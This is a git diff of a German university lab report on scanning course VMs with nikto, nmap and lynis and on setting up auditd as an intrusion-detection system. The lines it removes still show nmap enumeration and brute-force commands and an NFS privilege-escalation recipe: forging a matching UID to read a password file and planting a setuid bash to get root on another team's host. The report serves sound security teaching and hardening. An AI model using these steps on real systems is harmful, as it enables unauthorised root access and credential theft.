@@ -17,7 +17,7 @@
 
 #### 1.1 nikto
 
-nikto ist ein open soruce Webserver Scanner, der Webserver auf bekannte Sicherheitslücken, Fehlkonfigurationen und Schwachstellen scannt. 
+nikto ist ein open soruce Webserver Scanner, der Webserver auf bekannte Sicherheitslücken, Fehlkonfigurationen und Schwachstellen scannt.
 
 **Eigene VMs:**
 Wir haben nikto auf allen webservern von vm6 mit z.B. `nikto -h http://web1.psa-team03.cit.tum.de -C all` ausgeführt. Dabei haben wir keine Sicherheitslücken gefunden haben aber ein paar warmings bekommen wobei bei http 2 warnungen und bei https noch zwei weitere warnungen aufgetreten sind.
@@ -142,7 +142,6 @@ IP Address      Hostname                                 Open Ports (with Servic
 
 **Andere VMs:**
 
-
 - team 01: zum Zeitpunkt des Scans nicht erreichbar
 - team 02:
 
@@ -184,7 +183,6 @@ IP Address      Hostname                                 Open Ports (with Servic
 
     -> kein nfs share
 
-
 - team 05:
 
     ```bash
@@ -203,7 +201,6 @@ IP Address      Hostname                                 Open Ports (with Servic
     ```
 
     -> nfs on 192.168.5.7 mit /16
-
 
 - team 06:
 
@@ -677,74 +674,74 @@ Insgesamt hat lynis keine Sicherheitslücken gefunden, sondern nur Empfehlungen 
 **Andere VMs:**
 Leider nicht möglich da wir hierfür nicht die nötigen Rechte haben.
 
+**Wirksamkeit:**
+Recht effektiv um die Sicherheit der eigenen VMs zu überprüfen und zu verbessern.
 
+### 3. Intrusion Detection System
 
+Zum Schluss haben wir noch ein Intrusion Detection System (IDS) aufgesetzt. Hierfür haben wir auditd verwendet, ein Linux-Tool, das die Systemaufrufe überwacht und protokolliert. Es kann verwendet werden, um verdächtige Aktivitäten zu erkennen und zu verhindern. Hierfür haben wir die folgende bespielhafte Konfiguration auf `vm1` aufgesetzt:
 
+```nix
+{
+  security.auditd.enable = true;
 
-##### SQL
+  # Log management settings
+  security.audit = {
+    enable = true;
+  };
 
-mysql enumeration: versucht alle Datenbanken auf einem MySQL-Server zu enumerieren
-`nmap -p 3306 --script mysql-enum.nse <target>`
-mysql-brute: versucht ob der root user mit einem leeren Passwort auf einem MySQL-Server einloggen kann
-`nmap -p 3306 --script mysql-brute.nse <target>`
+  # Define audit rules
+  security.audit.rules = [
+    # ==== File Integrity Monitoring ==== 
+    # Monitor critical system files for changes
+    "-w /etc/passwd -p wa -k passwd_changes"
+    "-w /etc/shadow -p wa -k shadow_changes" 
+    "-w /etc/ssh/sshd_config -p wa -k sshd_config_changes" 
 
-##### SMB
+    # ==== User Activity Monitoring ====
+    # Track execution of privileged commands
+    "-a always,exit -F path=/usr/bin/sudo -F perm=x -F auid>=1000 -F auid!=4294967295 -k privileged_sudo"
+    "-a always,exit -F path=/bin/su -F perm=x -F auid>=1000 -F auid!=4294967295 -k privileged_su"
+    # Monitor user logins and authentication
+    "-w /var/log/auth.log -p rwxa -k auth_logs"
 
-aufzählung aller shares auf einem SMB-Server
-`nmap -p 139,445 --script smb-enum-shares.nse <target>`
-aufzählung aller Benutzer auf einem SMB-Server
-`nmap -p 139,445 --script smb-enum-users.nse <target>`
+    # ==== System Call Monitoring ====
+    # Detect suspicious use of chmod, chown, and mount
+    "-a always,exit -F arch=b64 -S chmod -S chown -S mount -k suspicious_changes"
+    "-a always,exit -F arch=b32 -S chmod -S chown -S mount -k suspicious_changes" 
+    # Monitor file deletions by users
+    "-a always,exit -F arch=b64 -S unlink -S rename -F auid>=1000 -F auid!=4294967295 -k file_deletion"   
+    "-a always,exit -F arch=b32 -S unlink -S rename -F auid>=1000 -F auid!=4294967295 -k file_deletion"
 
-##### NFS
+    # ==== Security Configuration Monitoring ====   
+    # Monitor changes to audit configuration
+    "-w /etc/audit/ -p wa -k audit_config_changes"
 
-aufzählung aller NFS-Exporte auf einem Server
-`nmap -p 111 --script nfs-ls.nse <target>`
-show mounts
-`showmount -e <IP>`
-mounting eines NFS-Exports
-
-```bash
-mkdir -p /mnt/nfs
-mount -t nfs 192.168.5.7:/export /mnt/nfs -o nolock
-ls -la /mnt/nfs
-# -> ckeck permissions
-# find /mnt/nfs -writable
-# crontab -l
-# cp $(which bash) .
-# chmod +s bash
-# ./bash -p
-# cp bash to atten home dir -> login as atten nd execute ./bash -p -> root
-useradd -m -u 10021 -G students newuser
-passwd newuser
-umount /mnt/nfs
-mount -t nfs 192.168.5.7:/export/atten /mnt/nfs -o nolock
-su - newuser
-cd /mnt/nfs
-cat atten.password
-# check if permissions -> if yes copy bash | else at least as atten user write and read permissions
-find /mnt/nfs -writable
+    # ==== Nix-Specific Optimization ====
+    # Exclude Nix store paths to reduce noise 
+    "-a never,exit -F dir=/nix/store -k nix_store"
+  ];
+}
 ```
 
-##### ldap
+Nun fehlt noch die Konfiguration von auditd selbst:
 
+- `mkdir -p /etc/audit`
+- `nano /etc/audit/auditd.conf` ->
 
-### 2. Dokumentation gefundener Sicherheitslücken
+    ```bash
+    log_file = /var/log/audit/audit.log
+    log_format = ENRICHED
+    max_log_file = 50
+    max_log_file_action = ROTATE
+    num_logs = 5
+    space_left = 50
+    admin_space_left = 25
+    disk_full_action = SUSPEND
+    disk_error_action = SUSPEND
+    ```
 
-bekannt:
+nach einen `switch-rebuild` ist das System bereit für die Überwachung. Hier ein kleiner test um zu sehen ob alles funktioniert:
 
-- kein tls bei mail
-- nfs unverschlüsselt
-- communikation mit datenbank unverschlüsselt?
-- communikation prometheus offen
-
-#### 2.1. Eigene VMs, local exploit
-
-#### 2.2. Eigene VMs, remote exploit
-
-#### 2.3. Andere VMs, local exploit
-
-#### 2.4. Andere VMs, remote exploit
-
-### 3. Schließung gefundener Sicherheitslücken und Sicherheitsmaßnahmen
-
-- `aideinit` als Intrusion Detection System
+- `sudo echo "Test audit log entry" >> /etc/passwd`
+- `sudo ausearch -k passwd_changes`
